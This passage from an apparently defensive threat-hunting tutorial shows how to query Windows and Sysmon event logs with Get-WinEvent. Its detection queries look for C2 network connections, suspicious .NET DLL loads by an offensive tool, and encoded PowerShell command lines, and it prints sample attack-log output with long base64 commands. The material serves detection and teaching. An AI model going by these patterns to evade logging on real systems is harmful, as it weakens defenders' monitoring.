Microsoft-Windows-WorkFolders/Operational                                                        0        False      True Circular    Operational
Microsoft-Windows-Wordpad/Admin                                                                           False     False Circular    Operational
Microsoft-Windows-WMPNSS-Service/Operational                                                     0        False      True Circular    Operational
Microsoft-Windows-WMI-Activity/Operational                                                     895        False      True Circular    Operational
Microsoft-Windows-wmbclass/Trace                                                                          False     False Circular    Operational
Microsoft-Windows-WLAN-AutoConfig/Operational                                                    0        False      True Circular    Operational
Microsoft-Windows-Wired-AutoConfig/Operational                                                   0        False      True Circular    Operational
Microsoft-Windows-Winsock-WS2HELP/Operational                                                    0        False      True Circular    Operational
Microsoft-Windows-Winsock-NameResolution/Operational                                                      False     False Circular    Operational
Microsoft-Windows-Winsock-AFD/Operational                                                                 False     False Circular    Operational
Microsoft-Windows-WinRM/Operational                                                            230        False      True Circular    Operational
Microsoft-Windows-WinNat/Oper                                                                             False     False Circular    Operational
Microsoft-Windows-Winlogon/Operational                                                         648        False      True Circular    Operational
Microsoft-Windows-WinINet-Config/ProxyConfigChanged                                              2        False      True Circular    Operational
--- SNIP ---
```
This command provides us with valuable information about each log, including the name of the log, the number of records present, whether the log is in the classic .evt format or the newer .evtx format, its enabled status, the log mode (Circular, Retain, or AutoBackup), and the log type (Administrative, Analytical, Debug, or Operational).

Additionally, we can explore the event log providers associated with each log using the -ListProvider parameter. Event log providers serve as the sources of events within the logs. Executing the following command allows us to retrieve the list of providers and their respective linked logs.

```
PS C:\Users\Administrator> Get-WinEvent -ListProvider * | Format-Table -AutoSize

Name                                                                       LogLinks
----                                                                       --------
PowerShell                                                                 {Windows PowerShell}
Workstation                                                                {System}
WMIxWDM                                                                    {System}
WinNat                                                                     {System}
Windows Script Host                                                        {System}
Microsoft-Windows-IME-OEDCompiler                                          {Microsoft-Windows-IME-OEDCompiler/Analytic}
Microsoft-Windows-DeviceSetupManager                                       {Microsoft-Windows-DeviceSetupManager/Operat...
Microsoft-Windows-Search-ProfileNotify                                     {Application}
Microsoft-Windows-Eventlog                                                 {System, Security, Setup, Microsoft-Windows-...
Microsoft-Windows-Containers-BindFlt                                       {Microsoft-Windows-Containers-BindFlt/Operat...
Microsoft-Windows-NDF-HelperClassDiscovery                                 {Microsoft-Windows-NDF-HelperClassDiscovery/...
Microsoft-Windows-FirstUX-PerfInstrumentation                              {FirstUXPerf-Analytic}
--- SNIP ---
```

This command provides us with an overview of the available providers and their associations with specific logs. It enables us to identify providers of interest for filtering purposes.

Now, let's focus on retrieving specific event logs using the Get-WinEvent cmdlet. At its most basic, Get-WinEvent retrieves event logs from local or remote computers. The examples below demonstrate how to retrieve events from various logs.

1. Retrieving events from the System log
```
PS C:\Users\Administrator> Get-WinEvent -LogName 'System' -MaxEvents 50 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize

TimeCreated            Id ProviderName                             LevelDisplayName Message
-----------            -- ------------                             ---------------- -------
6/2/2023 9:41:42 AM    16 Microsoft-Windows-Kernel-General         Information      The access history in hive \??\C:\Users\Administrator\AppData\Local\Packages\MicrosoftWindows.Client.CBS_cw5...
6/2/2023 9:38:32 AM    16 Microsoft-Windows-Kernel-General         Information      The access history in hive \??\C:\Users\Administrator\AppData\Local\Packages\Microsoft.Windows.ShellExperien...
6/2/2023 9:38:32 AM 10016 Microsoft-Windows-DistributedCOM         Warning          The machine-default permission settings do not grant Local Activation permission for the COM Server applicat...
6/2/2023 9:37:31 AM    16 Microsoft-Windows-Kernel-General         Information      The access history in hive \??\C:\Users\Administrator\AppData\Local\Packages\Microsoft.WindowsAlarms_8wekyb3...
6/2/2023 9:37:31 AM    16 Microsoft-Windows-Kernel-General         Information      The access history in hive \??\C:\Users\Administrator\AppData\Local\Packages\microsoft.windowscommunications...
6/2/2023 9:37:31 AM    16 Microsoft-Windows-Kernel-General         Information      The access history in hive \??\C:\Users\Administrator\AppData\Local\Packages\Microsoft.Windows.ContentDelive...
6/2/2023 9:36:35 AM    16 Microsoft-Windows-Kernel-General         Information      The access history in hive \??\C:\Users\Administrator\AppData\Local\Packages\Microsoft.YourPhone_8wekyb3d8bb...
6/2/2023 9:36:32 AM    16 Microsoft-Windows-Kernel-General         Information      The access history in hive \??\C:\Users\Administrator\AppData\Local\Packages\Microsoft.AAD.BrokerPlugin_cw5n...
6/2/2023 9:36:30 AM    16 Microsoft-Windows-Kernel-General         Information      The access history in hive \??\C:\Users\Administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h...
6/2/2023 9:36:29 AM    16 Microsoft-Windows-Kernel-General         Information      The access history in hive \??\C:\Users\Administrator\AppData\Local\Packages\Microsoft.Windows.StartMenuExpe...
6/2/2023 9:36:14 AM    16 Microsoft-Windows-Kernel-General         Information      The access history in hive \??\C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat was clear...
6/2/2023 9:36:14 AM    16 Microsoft-Windows-Kernel-General         Information      The access history in hive \??\C:\Users\Administrator\ntuser.dat was cleared updating 2366 keys and creating...
6/2/2023 9:36:14 AM  7001 Microsoft-Windows-Winlogon               Information      User Logon Notification for Customer Experience Improvement Program	
6/2/2023 9:33:04 AM    16 Microsoft-Windows-Kernel-General         Information      The access history in hive \??\C:\Windows\AppCompat\Programs\Amcache.hve was cleared updating 920 keys and c...
6/2/2023 9:31:54 AM    16 Microsoft-Windows-Kernel-General         Information      The access history in hive \??\C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Windows\Del...
6/2/2023 9:30:23 AM    16 Microsoft-Windows-Kernel-General         Information      The access history in hive \??\C:\Windows\System32\config\COMPONENTS was cleared updating 54860 keys and cre...
6/2/2023 9:30:16 AM    15 Microsoft-Windows-Kernel-General         Information      Hive \SystemRoot\System32\config\DRIVERS was reorganized with a starting size of 3956736 bytes and an ending...
6/2/2023 9:30:10 AM  1014 Microsoft-Windows-DNS-Client             Warning          Name resolution for the name settings-win.data.microsoft.com timed out after none of the configured DNS serv...
6/2/2023 9:29:54 AM  7026 Service Control Manager                  Information      The following boot-start or system-start driver(s) did not load: ...
6/2/2023 9:29:54 AM 10148 Microsoft-Windows-WinRM                  Information      The WinRM service is listening for WS-Management requests. ...
6/2/2023 9:29:51 AM 51046 Microsoft-Windows-DHCPv6-Client          Information      DHCPv6 client service is started
--- SNIP ---
```

This example retrieves the first 50 events from the System log. It selects specific properties, including the event's creation time, ID, provider name, level display name, and message. This facilitates easier analysis and troubleshooting.

2. Retrieving events from Microsoft-Windows-WinRM/Operational

```
PS C:\Users\Administrator> Get-WinEvent -LogName 'Microsoft-Windows-WinRM/Operational' -MaxEvents 30 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize

TimeCreated            Id ProviderName            LevelDisplayName Message
-----------            -- ------------            ---------------- -------
6/2/2023 9:30:15 AM   132 Microsoft-Windows-WinRM Information      WSMan operation Enumeration completed successfully
6/2/2023 9:30:15 AM   145 Microsoft-Windows-WinRM Information      WSMan operation Enumeration started with resourceUri...
6/2/2023 9:30:15 AM   132 Microsoft-Windows-WinRM Information      WSMan operation Enumeration completed successfully
6/2/2023 9:30:15 AM   145 Microsoft-Windows-WinRM Information      WSMan operation Enumeration started with resourceUri...
6/2/2023 9:29:54 AM   209 Microsoft-Windows-WinRM Information      The Winrm service started successfully
--- SNIP ---
```

In this example, events are retrieved from the Microsoft-Windows-WinRM/Operational log. The command retrieves the first 30 events and selects relevant properties for display, including the event's creation time, ID, provider name, level display name, and message.

To retrieve the oldest events, instead of manually sorting the results, we can utilize the -Oldest parameter with the Get-WinEvent cmdlet. This parameter allows us to retrieve the first events based on their chronological order. The following command demonstrates how to retrieve the oldest 30 events from the 'Microsoft-Windows-WinRM/Operational' log.


```
PS C:\Users\Administrator> Get-WinEvent -LogName 'Microsoft-Windows-WinRM/Operational' -Oldest -MaxEvents 30 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize

TimeCreated           Id ProviderName            LevelDisplayName Message
-----------            -- ------------            ---------------- -------
8/3/2022 4:41:38 PM  145 Microsoft-Windows-WinRM Information      WSMan operation Enumeration started with resourceUri ...
8/3/2022 4:41:42 PM  254 Microsoft-Windows-WinRM Information      Activity Transfer
8/3/2022 4:41:42 PM  161 Microsoft-Windows-WinRM Error            The client cannot connect to the destination specifie...
8/3/2022 4:41:42 PM  142 Microsoft-Windows-WinRM Error            WSMan operation Enumeration failed, error code 215085...
8/3/2022 9:51:03 AM  145 Microsoft-Windows-WinRM Information      WSMan operation Enumeration started with resourceUri ...
8/3/2022 9:51:07 AM  254 Microsoft-Windows-WinRM Information      Activity Transfer
```

3. Retrieving events from .evtx Files
If you have an exported .evtx file from another computer or you have backed up an existing log, you can utilize the Get-WinEvent cmdlet to read and query those logs. This capability is particularly useful for auditing purposes or when you need to analyze logs within scripts.

To retrieve log entries from a .evtx file, you need to provide the log file's path using the -Path parameter. The example below demonstrates how to read events from the 'C:\Tools\chainsaw\EVTX-ATTACK-SAMPLES\Execution\exec_sysmon_1_lolbin_pcalua.evtx' file, which represents an exported Windows PowerShell log.

```
PS C:\Users\Administrator> Get-WinEvent -Path 'C:\Tools\chainsaw\EVTX-ATTACK-SAMPLES\Execution\exec_sysmon_1_lolbin_pcalua.evtx' -MaxEvents 5 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize

TimeCreated           Id ProviderName             LevelDisplayName Message
-----------           -- ------------             ---------------- -------
5/12/2019 10:01:51 AM  1 Microsoft-Windows-Sysmon Information      Process Create:...
5/12/2019 10:01:50 AM  1 Microsoft-Windows-Sysmon Information      Process Create:...
5/12/2019 10:01:43 AM  1 Microsoft-Windows-Sysmon Information      Process Create:...
```
By specifying the path of the log file using the -Path parameter, we can retrieve events from that specific file. The command selects relevant properties and formats the output for easier analysis, displaying the event's creation time, ID, provider name, level display name, and message.

4. Filtering events with FilterHashtable

To filter Windows event logs, we can use the -FilterHashtable parameter, which enables us to define specific conditions for the logs we want to retrieve.

```
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1,3} | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize

TimeCreated           Id ProviderName             LevelDisplayName Message
-----------           -- ------------             ---------------- -------
6/2/2023 10:40:09 AM   1 Microsoft-Windows-Sysmon Information      Process Create:...
6/2/2023 10:39:01 AM   1 Microsoft-Windows-Sysmon Information      Process Create:...
6/2/2023 10:34:12 AM   1 Microsoft-Windows-Sysmon Information      Process Create:...
6/2/2023 10:33:26 AM   1 Microsoft-Windows-Sysmon Information      Process Create:...
6/2/2023 10:33:16 AM   1 Microsoft-Windows-Sysmon Information      Process Create:...
6/2/2023 9:36:10 AM    3 Microsoft-Windows-Sysmon Information      Network connection detected:...
5/29/2023 6:30:26 PM   1 Microsoft-Windows-Sysmon Information      Process Create:...
5/29/2023 6:30:24 PM   3 Microsoft-Windows-Sysmon Information      Network connection detected:...
```
he command above retrieves events with IDs 1 and 3 from the Microsoft-Windows-Sysmon/Operational event log, selects specific properties from those events, and displays them in a table format. Note: If we observe Sysmon event IDs 1 and 3 (related to "dangerous" or uncommon binaries) occurring within a short time frame, it could potentially indicate the presence of a process communicating with a Command and Control (C2) server.

For exported events the equivalent command is the following.

```
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{Path='C:\Tools\chainsaw\EVTX-ATTACK-SAMPLES\Execution\sysmon_mshta_sharpshooter_stageless_meterpreter.evtx'; ID=1,3} | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize

TimeCreated           Id ProviderName             LevelDisplayName Message
-----------           -- ------------             ---------------- -------
6/15/2019 12:14:32 AM  1 Microsoft-Windows-Sysmon Information      Process Create:...
6/15/2019 12:13:44 AM  3 Microsoft-Windows-Sysmon Information      Network connection detected:...
6/15/2019 12:13:42 AM  1 Microsoft-Windows-Sysmon Information      Process Create:...
```

Note: These logs are related to a process communicating with a Command and Control (C2) server right after it was created.

If we want the get event logs based on a date range (5/28/23 - 6/2/2023), this can be done as follows.

```
 PS C:\Users\Administrator> $startDate = (Get-Date -Year 2023 -Month 5 -Day 28).Date
 PS C:\Users\Administrator> $endDate   = (Get-Date -Year 2023 -Month 6 -Day 3).Date
 PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1,3; StartTime=$startDate; EndTime=$endDate} | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize

 TimeCreated           Id ProviderName             LevelDisplayName Message
-----------           -- ------------             ---------------- -------
6/2/2023 3:26:56 PM    1 Microsoft-Windows-Sysmon Information      Process Create:...
6/2/2023 3:25:20 PM    1 Microsoft-Windows-Sysmon Information      Process Create:...
6/2/2023 3:25:20 PM    1 Microsoft-Windows-Sysmon Information      Process Create:...
6/2/2023 3:24:13 PM    1 Microsoft-Windows-Sysmon Information      Process Create:...
6/2/2023 3:24:13 PM    1 Microsoft-Windows-Sysmon Information      Process Create:...
6/2/2023 3:23:41 PM    1 Microsoft-Windows-Sysmon Information      Process Create:...
6/2/2023 3:20:27 PM    1 Microsoft-Windows-Sysmon Information      Process Create:...
6/2/2023 3:20:26 PM    1 Microsoft-Windows-Sysmon Information      Process Create:...
--- SNIP ---
```

Note: The above will filter between the start date inclusive and the end date exclusive. That's why we specified June 3rd and not 2nd.

5. Filtering events with FilterHashtable & XML
Consider an intrusion detection scenario where a suspicious network connection to a particular IP (52.113.194.132) has been identified. With Sysmon installed, you can use Event ID 3 (Network Connection) logs to investigate the potential threat.

```
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=3} |
`ForEach-Object {
$xml = [xml]$_.ToXml()
$eventData = $xml.Event.EventData.Data
New-Object PSObject -Property @{
    SourceIP = $eventData | Where-Object {$_.Name -eq "SourceIp"} | Select-Object -ExpandProperty '#text'
    DestinationIP = $eventData | Where-Object {$_.Name -eq "DestinationIp"} | Select-Object -ExpandProperty '#text'
    ProcessGuid = $eventData | Where-Object {$_.Name -eq "ProcessGuid"} | Select-Object -ExpandProperty '#text'
    ProcessId = $eventData | Where-Object {$_.Name -eq "ProcessId"} | Select-Object -ExpandProperty '#text'
}
}  | Where-Object {$_.DestinationIP -eq "52.113.194.132"}

DestinationIP  ProcessId SourceIP       ProcessGuid
-------------  --------- --------       -----------
52.113.194.132 9196      10.129.205.123 {52ff3419-51ad-6475-1201-000000000e00}
52.113.194.132 5996      10.129.203.180 {52ff3419-54f3-6474-3d03-000000000c00}
```

This script will retrieve all Sysmon network connection events (ID 3), parse the XML data for each event to retrieve specific details (source IP, destination IP, Process GUID, and Process ID), and filter the results to include only events where the destination IP matches the suspected IP.

Further, we can use the ProcessGuid to trace back the original process that made the connection, enabling us to understand the process tree and identify any malicious executables or scripts.

You might wonder how we could have been aware of Event.EventData.Data. The Windows XML EventLog (EVTX) format can be found here.

In the "Tapping Into ETW" section we were looking for anomalous clr.dll and mscoree.dll loading activity in processes that ordinarily wouldn't require them. The command below is leveraging Sysmon's Event ID 7 to detect the loading of abovementioned DLLs.

```
S C:\Users\Administrator> $Query = @"
	<QueryList>
		<Query Id="0">
			<Select Path="Microsoft-Windows-Sysmon/Operational">*[System[(EventID=7)]] and *[EventData[Data='mscoree.dll']] or *[EventData[Data='clr.dll']]
			</Select>
		</Query>
	</QueryList>
	"@
PS C:\Users\Administrator> Get-WinEvent -FilterXml $Query | ForEach-Object {Write-Host $_.Message `n}
Image loaded:
RuleName: -
UtcTime: 2023-06-05 22:23:16.560
ProcessGuid: {52ff3419-6054-647e-aa02-000000001000}
ProcessId: 2936
Image: C:\Tools\GhostPack Compiled Binaries\Seatbelt.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
FileVersion: 4.8.4515.0 built by: NET48REL1LAST_C
Description: Microsoft .NET Runtime Common Language Runtime - 	WorkStation
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: clr.dll
Hashes: MD5=2B0E5597FF51A3A4D5BB2DDAB0214531,SHA256=8D09CE35C987EADCF01686BB559920951B0116985FE4FEB5A488A6A8F7C4BDB9,IMPHASH=259C196C67C4E02F941CAD54D9D9BB8A
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-NU10MTO\Administrator

Image loaded:
RuleName: -
UtcTime: 2023-06-05 22:23:16.544
ProcessGuid: {52ff3419-6054-647e-aa02-000000001000}
ProcessId: 2936
Image: C:\Tools\GhostPack Compiled Binaries\Seatbelt.exe
ImageLoaded: C:\Windows\System32\mscoree.dll
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Microsoft .NET Runtime Execution Engine
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: mscoree.dll
Hashes: MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-NU10MTO\Administrator
--- SNIP ---
```

6. Filtering events with FilterXPath

To use XPath queries with Get-WinEvent, we need to use the -FilterXPath parameter. This allows us to craft an XPath query to filter the event logs.

For instance, if we want to get Process Creation (Sysmon Event ID 1) events in the Sysmon log to identify installation of any Sysinterals tool we can use the command below. Note: During the installation of a Sysinternals tool the user must accept the presented EULA. The acceptance action involves the registry key included in the command below.

```
PS C:\Users\Administrator> Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -FilterXPath "*[EventData[Data[@Name='Image']='C:\Windows\System32\reg.exe']] and *[EventData[Data[@Name='CommandLine']='`"C:\Windows\system32\reg.exe`" ADD HKCU\Software\Sysinternals /v EulaAccepted /t REG_DWORD /d 1 /f']]" | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize

 TimeCreated           Id ProviderName             LevelDisplayName Message
-----------           -- ------------             ---------------- -------
5/29/2023 12:44:46 AM  1 Microsoft-Windows-Sysmon Information      Process Create:...
5/29/2023 12:29:53 AM  1 Microsoft-Windows-Sysmon Information      Process Create:...
```

Note: Image and CommandLine can be identified by browsing the XML representation of any Sysmon event with ID 1 through, for example, Event Viewer.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/baf6df3a-804e-442d-840c-4f9604a68d23)


Lastly, suppose we want to investigate any network connections to a particular suspicious IP address (52.113.194.132) that Sysmon has logged. To do that we could use the following command.

```
PS C:\Users\Administrator> Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -FilterXPath "*[System[EventID=3] and EventData[Data[@Name='DestinationIp']='52.113.194.132']]"

ProviderName: Microsoft-Windows-Sysmon

TimeCreated                      Id LevelDisplayName Message
-----------                      -- ---------------- -------
5/29/2023 6:30:24 PM              3 Information      Network connection detected:...
5/29/2023 12:32:05 AM             3 Information      Network connection detected:...
```

7. Filtering events based on property values

The -Property * parameter, when used with Select-Object, instructs the command to select all properties of the objects passed to it. In the context of the Get-WinEvent command, these properties will include all available information about the event. Let's see an example that will present us with all properties of Sysmon event ID 1 logs.

```
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} -MaxEvents 1 | Select-Object -Property *


Message            : Process Create:
                   RuleName: -
                   UtcTime: 2023-06-03 01:24:25.104
                   ProcessGuid: {52ff3419-9649-647a-1902-000000001000}
                   ProcessId: 1036
                   Image: C:\Windows\System32\taskhostw.exe
                   FileVersion: 10.0.19041.1806 (WinBuild.160101.0800)
                   Description: Host Process for Windows Tasks
                   Product: Microsoft® Windows® Operating System
                   Company: Microsoft Corporation
                   OriginalFileName: taskhostw.exe
                   CommandLine: taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly
                   CurrentDirectory: C:\Windows\system32\
                   User: NT AUTHORITY\SYSTEM
                   LogonGuid: {52ff3419-85d0-647a-e703-000000000000}
                   LogonId: 0x3E7
                   TerminalSessionId: 0
                   IntegrityLevel: System
                   Hashes: MD5=C7B722B96F3969EACAE9FA205FAF7EF0,SHA256=76D3D02B265FA5768294549C938D3D9543CC9FEF6927
                   4728E0A72E3FCC335366,IMPHASH=3A0C6863CDE566AF997DB2DEFFF9D924
                   ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
                   ParentProcessId: 1664
                   ParentImage: -
                   ParentCommandLine: -
                   ParentUser: -
Id                   : 1
Version              : 5
Qualifiers           :
Level                : 4
Task                 : 1
Opcode               : 0
Keywords             : -9223372036854775808
RecordId             : 32836
ProviderName         : Microsoft-Windows-Sysmon
ProviderId           : 5770385f-c22a-43e0-bf4c-06f5698ffbd9
LogName              : Microsoft-Windows-Sysmon/Operational
ProcessId            : 2900
ThreadId             : 2436
MachineName          : DESKTOP-NU10MTO
UserId               : S-1-5-18
TimeCreated          : 6/2/2023 6:24:25 PM
ActivityId           :
RelatedActivityId    :
ContainerLog         : Microsoft-Windows-Sysmon/Operational
MatchedQueryIds      : {}
Bookmark             : 		System.Diagnostics.Eventing.Reader.EventBookmark
LevelDisplayName     : Information
OpcodeDisplayName    : Info
TaskDisplayName      : Process Create (rule: ProcessCreate)
KeywordsDisplayNames : {}
Properties           : {System.Diagnostics.Eventing.Reader.EventProperty,
                   System.Diagnostics.Eventing.Reader.EventProperty,
                   System.Diagnostics.Eventing.Reader.EventProperty,
                   System.Diagnostics.Eventing.Reader.EventProperty...}
```


Let's now see an example of a command that retrieves Process Create events from the Microsoft-Windows-Sysmon/Operational log, checks the parent command line of each event for the string -enc, and then displays all properties of any matching events as a list.

```
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} | Where-Object {$_.Properties[21].Value -like "*-enc*"} | Format-List

TimeCreated  : 5/29/2023 12:44:58 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 1
Message      : Process Create:
           RuleName: -
           UtcTime: 2023-05-29 07:44:58.467
           ProcessGuid: {52ff3419-57fa-6474-7005-000000000c00}
           ProcessId: 2660
           Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
           FileVersion: 4.8.4084.0 built by: NET48REL1
           Description: Visual C# Command Line Compiler
           Product: Microsoft® .NET Framework
           Company: Microsoft Corporation
           OriginalFileName: csc.exe
           CommandLine: "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths
           @"C:\Users\ADMINI~1\AppData\Local\Temp\z5erlc11.cmdline"
           CurrentDirectory: C:\Users\Administrator\
           User: DESKTOP-NU10MTO\Administrator
           LogonGuid: {52ff3419-57f9-6474-8071-510000000000}
           LogonId: 0x517180
           TerminalSessionId: 0
           IntegrityLevel: High
           Hashes: MD5=F65B029562077B648A6A5F6A1AA76A66,SHA256=4A6D0864E19C0368A47217C129B075DDDF61A6A262388F9D2104
           5D82F3423ED7,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D
           ParentProcessGuid: {52ff3419-57f9-6474-6e05-000000000c00}
           ParentProcessId: 5840
           ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
           ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile
           -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand JgBjAGgAYwBwAC4AYwBvAG0AIAA2ADUAMAAwADEAIA
           A+ACAAJABuAHUAbABsAAoAaQBmACAAKAAkAFAAUwBWAGUAcgBzAGkAbwBuAFQAYQBiAGwAZQAuAFAAUwBWAGUAcgBzAGkAbwBuACAALQ
           BsAHQAIABbAFYAZQByAHMAaQBvAG4AXQAiADMALgAwACIAKQAgAHsACgAnAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQ
           BzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbw
           ByACAAbgBlAHcAZQByACIAfQAnAAoAZQB4AGkAdAAgADEACgB9AAoAJABlAHgAZQBjAF8AdwByAGEAcABwAGUAcgBfAHMAdAByACAAPQ
           AgACQAaQBuAHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcACgAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAgAD0AIAAkAGUAeA
           BlAGMAXwB3AHIAYQBwAHAAZQByAF8AcwB0AHIALgBTAHAAbABpAHQAKABAACgAIgBgADAAYAAwAGAAMABgADAAIgApACwAIAAyACwAIA
           BbAFMAdAByAGkAbgBnAFMAcABsAGkAdABPAHAAdABpAG8AbgBzAF0AOgA6AFIAZQBtAG8AdgBlAEUAbQBwAHQAeQBFAG4AdAByAGkAZQ
           BzACkACgBJAGYAIAAoAC0AbgBvAHQAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAuAEwAZQBuAGcAdABoACAALQBlAHEAIAAyACkAIA
           B7ACAAdABoAHIAbwB3ACAAIgBpAG4AdgBhAGwAaQBkACAAcABhAHkAbABvAGEAZAAiACAAfQAKAFMAZQB0AC0AVgBhAHIAaQBhAGIAbA
           BlACAALQBOAGEAbQBlACAAagBzAG8AbgBfAHIAYQB3ACAALQBWAGEAbAB1AGUAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADEAXQ
           AKACQAZQB4AGUAYwBfAHcAcgBhAHAAcABlAHIAIAA9ACAAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKA
           AkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADAAXQApAAoAJgAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAA==
           ParentUser: DESKTOP-NU10MTO\Administrator

TimeCreated  : 5/29/2023 12:44:57 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 1
Message      : Process Create:
           RuleName: -
           UtcTime: 2023-05-29 07:44:57.919
           ProcessGuid: {52ff3419-57f9-6474-6f05-000000000c00}
           ProcessId: 3060
           Image: C:\Windows\System32\chcp.com
           FileVersion: 10.0.19041.1806 (WinBuild.160101.0800)
           Description: Change CodePage Utility
           Product: Microsoft® Windows® Operating System
           Company: Microsoft Corporation
           OriginalFileName: CHCP.COM
           CommandLine: "C:\Windows\system32\chcp.com" 65001
           CurrentDirectory: C:\Users\Administrator\
           User: DESKTOP-NU10MTO\Administrator
           LogonGuid: {52ff3419-57f9-6474-8071-510000000000}
           LogonId: 0x517180
           TerminalSessionId: 0
           IntegrityLevel: High
           Hashes: MD5=33395C4732A49065EA72590B14B64F32,SHA256=025622772AFB1486F4F7000B70CC51A20A640474D6E4DBE95A70
           BEB3FD53AD40,IMPHASH=75FA51C548B19C4AD5051FAB7D57EB56
           ParentProcessGuid: {52ff3419-57f9-6474-6e05-000000000c00}
           ParentProcessId: 5840
           ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
           ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile
           -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand JgBjAGgAYwBwAC4AYwBvAG0AIAA2ADUAMAAwADEAIA
           A+ACAAJABuAHUAbABsAAoAaQBmACAAKAAkAFAAUwBWAGUAcgBzAGkAbwBuAFQAYQBiAGwAZQAuAFAAUwBWAGUAcgBzAGkAbwBuACAALQ
           BsAHQAIABbAFYAZQByAHMAaQBvAG4AXQAiADMALgAwACIAKQAgAHsACgAnAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQ
           BzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbw
           ByACAAbgBlAHcAZQByACIAfQAnAAoAZQB4AGkAdAAgADEACgB9AAoAJABlAHgAZQBjAF8AdwByAGEAcABwAGUAcgBfAHMAdAByACAAPQ
           AgACQAaQBuAHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcACgAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAgAD0AIAAkAGUAeA
           BlAGMAXwB3AHIAYQBwAHAAZQByAF8AcwB0AHIALgBTAHAAbABpAHQAKABAACgAIgBgADAAYAAwAGAAMABgADAAIgApACwAIAAyACwAIA
           BbAFMAdAByAGkAbgBnAFMAcABsAGkAdABPAHAAdABpAG8AbgBzAF0AOgA6AFIAZQBtAG8AdgBlAEUAbQBwAHQAeQBFAG4AdAByAGkAZQ
           BzACkACgBJAGYAIAAoAC0AbgBvAHQAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAuAEwAZQBuAGcAdABoACAALQBlAHEAIAAyACkAIA
           B7ACAAdABoAHIAbwB3ACAAIgBpAG4AdgBhAGwAaQBkACAAcABhAHkAbABvAGEAZAAiACAAfQAKAFMAZQB0AC0AVgBhAHIAaQBhAGIAbA
           BlACAALQBOAGEAbQBlACAAagBzAG8AbgBfAHIAYQB3ACAALQBWAGEAbAB1AGUAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADEAXQ
           AKACQAZQB4AGUAYwBfAHcAcgBhAHAAcABlAHIAIAA9ACAAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKA
           AkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADAAXQApAAoAJgAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAA==
